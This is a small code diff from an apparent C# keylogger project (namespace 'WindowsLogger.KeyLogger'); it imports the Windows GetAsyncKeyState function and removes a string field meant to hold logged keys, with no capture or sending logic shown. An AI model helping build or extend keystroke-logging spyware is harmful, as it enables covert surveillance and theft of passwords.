@@ -13,8 +13,6 @@ namespace WindowsLogger.KeyLogger
 		[DllImport("User32.dll")]
 		public static extern int GetAsyncKeyState(Int32 i);
 
-		static string keyLog = "";
-
 
 		public void run()
 		{
